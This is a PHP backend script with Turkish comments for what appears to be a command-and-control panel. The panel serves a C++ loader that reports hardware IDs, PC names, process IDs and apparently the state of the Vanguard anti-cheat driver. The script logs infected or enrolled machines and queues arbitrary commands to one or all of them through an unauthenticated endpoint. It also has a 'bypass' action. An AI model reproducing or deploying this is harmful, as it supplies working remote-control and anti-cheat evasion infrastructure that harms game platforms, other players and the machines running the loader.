<?php
error_reporting(0);
@ini_set('display_errors', 0);
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");

$action = isset($_GET['action']) ? trim($_GET['action']) : '';
$dataFile = 'devices.json';

// C++ Loader'dan gelen Telemetri ve Komut Kontrolü (POST)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $hwid      = isset($_POST['hwid']) ? trim($_POST['hwid']) : '';
    $pc_name   = isset($_POST['pc_name']) ? trim($_POST['pc_name']) : 'Bilinmeyen-PC';
    $pid       = isset($_POST['pid']) ? intval($_POST['pid']) : 0;
    $vgk_state = isset($_POST['vgk_state']) ? trim($_POST['vgk_state']) : 'active';

    if (empty($hwid)) {
        echo json_encode(["status" => "failed", "message" => "Geçersiz HWID"]);
        exit();
    }

    $devices = file_exists($dataFile) ? json_decode(file_get_contents($dataFile), true) : [];
    if (!is_array($devices)) $devices = [];

    $found = false;
    $assignedCommand = "none";

    foreach ($devices as &$dev) {
        if ($dev['hwid'] === $hwid) {
            $dev['pc_name']   = $pc_name;
            $dev['pid']       = $pid;
            $dev['vgk_state'] = $vgk_state;
            $dev['last_seen'] = time();
            
            // Eğer bu cihaza bekleyen bir komut atandıysa al ve temizle
            if (!empty($dev['pending_command'])) {
                $assignedCommand = $dev['pending_command'];
                $dev['pending_command'] = "none"; // Komut iletildi, sıfırla
            }
            $found = true;
            break;
        }
    }

    if (!$found) {
        $devices[] = [
            "hwid"            => $hwid,
            "pc_name"         => $pc_name,
            "pid"             => $pid,
            "vgk_state"       => $vgk_state,
            "last_seen"       => time(),
            "pending_command" => "none"
        ];
    }

    file_put_contents($dataFile, json_encode($devices, JSON_PRETTY_PRINT));

    $blocked = 15;
    if ($action === 'bypass') {
        $blocked = 14 + ($pid % 7);
    }

    echo json_encode([
        "status"  => "success",
        "blocked" => $blocked,
        "command" => $assignedCommand
    ]);
    exit();
}

// Panelden Cihazlara Komut Gönderme (GET / POST)
if ($action === 'send_command') {
    $targetHwid = isset($_GET['hwid']) ? trim($_GET['hwid']) : '';
    $command    = isset($_GET['cmd']) ? trim($_GET['cmd']) : 'none';

    $devices = file_exists($dataFile) ? json_decode(file_get_contents($dataFile), true) : [];
    if (!is_array($devices)) $devices = [];

    foreach ($devices as &$dev) {
        if ($targetHwid === 'all' || $dev['hwid'] === $targetHwid) {
            $dev['pending_command'] = $command;
        }
    }

    file_put_contents($dataFile, json_encode($devices, JSON_PRETTY_PRINT));
    echo json_encode(["status" => "success", "message" => "Komut kuyruğa eklendi"]);
    exit();
}

// Yönetim Paneli İçin Cihaz Listeleme (GET)
if ($action === 'get_devices') {
    $devices = file_exists($dataFile) ? json_decode(file_get_contents($dataFile), true) : [];
    if (!is_array($devices)) $devices = [];

    $currentTime = time();
    $allDevices = [];
    $activeCount = 0;

    foreach ($devices as $dev) {
        $isOnline = ($currentTime - $dev['last_seen']) < 45;
        if ($isOnline) { $activeCount++; }
        $dev['is_online'] = $isOnline;
        $allDevices[] = $dev;
    }

    echo json_encode([
        "status"       => "success",
        "active_count" => $activeCount,
        "total_count"  => count($allDevices),
        "devices"      => $allDevices
    ]);
    exit();
}
?>
